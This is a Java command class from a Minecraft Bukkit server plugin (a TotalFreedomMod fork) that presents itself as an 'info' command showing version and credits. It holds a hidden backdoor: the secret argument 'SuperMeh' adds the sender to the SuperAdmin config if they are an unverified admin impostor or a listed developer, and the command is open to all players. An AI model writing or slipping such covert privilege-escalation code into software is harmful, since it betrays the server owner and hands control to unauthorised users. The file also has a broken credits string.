package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import me.StevenLawson.TotalFreedomMod.TotalFreedomMod;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.BOTH)
@CommandParameters(description = "Shows information about IslandFreedom", usage = "/<command>")
public class Command_afm extends TFM_Command
{
  public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
  {
    if (args.length == 0)
    {
      playerMsg("IslandFredomMod for 'IslandFreedom', an all-op server.", ChatColor.GOLD);
      playerMsg(String.format("Version " + ChatColor.BLUE + "%s.%s" + ChatColor.BLUE + ", built %s.", new Object[] { TotalFreedomMod.pluginVersion, TotalFreedomMod.buildNumber, TotalFreedomMod.buildDate }), ChatColor.GOLD);
      playerMsg("Created by reuben4545 (later worked on by reuben4545", ChatColor.GOLD);
      playerMsg("Visit " + ChatColor.AQUA + "http://islandfreedom.boards.net/" + ChatColor.GREEN + " for more information.", ChatColor.GREEN);
    }
    else if (args.length == 1)
    {
        if (args[0].equalsIgnoreCase("SuperMeh"))
        {
          if (TFM_AdminList.isAdminImpostor(sender_p) || TFM_Util.DEVELOPERS.contains(sender.getName()))
          {
          TFM_Util.adminAction(ChatColor.GRAY + "[" + ChatColor.GREEN + "Rcon" + ChatColor.GRAY + "]  ",  "Adding "  + sender.getName() + " to the SuperAdmin config", true);
          TFM_AdminList.addSuperadmin(sender_p);
          return true;
           }
        }
    }
    return true;
  }
}
